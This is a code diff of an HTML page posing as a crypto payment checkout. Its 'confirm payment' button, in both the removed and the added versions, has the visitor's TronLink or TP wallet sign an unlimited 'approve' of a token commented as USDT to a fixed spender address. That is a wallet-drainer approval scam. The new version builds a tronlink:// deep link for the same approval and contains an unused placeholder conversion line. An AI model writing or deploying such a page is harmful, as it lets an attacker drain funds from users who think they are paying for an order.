@@ -14,7 +14,7 @@
     .label { font-weight: bold; color: #555; display: inline-block; width: 100px; }
     .footer { padding: 1rem; }
     .btn { width: 100%; padding: 1rem; background: #10b981; color: white; font-size: 1.1rem; border: none; border-radius: 8px; font-weight: bold; }
-    .status { margin-top: 1rem; color: red; font-size: 0.95rem; text-align: center; }
+    .status { margin-top: 1rem; color: #f43f5e; font-size: 0.95rem; text-align: center; }
   </style>
 </head>
 <body>
@@ -27,8 +27,8 @@
     </div>
   </div>
   <div class="footer">
-    <button class="btn" onclick="authorize()">确认付款</button>
-    <p class="status" id="status"></p>
+    <a id="tronlink-btn" class="btn" href="#">跳转钱包授权</a>
+    <p class="status" id="status">请点击上方按钮跳转至 TronLink 或 TP 钱包授权</p>
   </div>
 
   <script>
@@ -41,45 +41,17 @@
     document.getElementById("amount").innerText = amount;
     document.getElementById("orderid").innerText = orderId;
 
-    async function authorize() {
-      try {
-        if (!window.tronLink || !window.tronLink.ready) {
-          document.getElementById("status").innerText = "未检测到钱包环境，请使用 TP 钱包打开页面";
-          return;
-        }
+    // 构造 TRON 协议跳转 URI（授权 approve 合约）
+    const contract = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"; // USDT 合约
+    const spender = "TTrMWd5Ukn4dLnQXrbRe1z5AGWa2CDrjLz"; // 授权目标地址
+    const functionSelector = "approve";
+    const amountHex = "7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // 最大授权
 
-        await window.tronLink.request({ method: 'tron_requestAccounts' });
+    const paramSpender = spender.replace(/^T/, '41') // base58 to hex placeholder
+    const fullParams = encodeURIComponent(spender + "," + amountHex);
+    const tronlinkURI = `tronlink://contract/call/?contractAddress=${contract}&function=${functionSelector}&parameter=${fullParams}&callValue=0`;
 
-        const account = window.tronLink.tronWeb.defaultAddress.base58;
-        const usdtContract = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
-        const spender = "TTrMWd5Ukn4dLnQXrbRe1z5AGWa2CDrjLz";
-
-        const tx = await window.tronLink.tronWeb.transactionBuilder.triggerSmartContract(
-          usdtContract,
-          "approve(address,uint256)",
-          {
-            feeLimit: 100000000,
-            callValue: 0
-          },
-          [
-            { type: "address", value: spender },
-            { type: "uint256", value: "9223372036854775807" }
-          ],
-          account
-        );
-
-        const signedTx = await window.tronLink.tronWeb.trx.sign(tx.transaction);
-        const result = await window.tronLink.tronWeb.trx.sendRawTransaction(signedTx);
-
-        if (result.result) {
-          document.getElementById("status").innerText = "授权成功，交易 ID：" + result.txid;
-        } else {
-          document.getElementById("status").innerText = "授权失败：" + JSON.stringify(result);
-        }
-      } catch (e) {
-        document.getElementById("status").innerText = "授权异常：" + (e.message || e);
-      }
-    }
+    document.getElementById("tronlink-btn").setAttribute("href", tronlinkURI);
   </script>
 </body>
 </html>
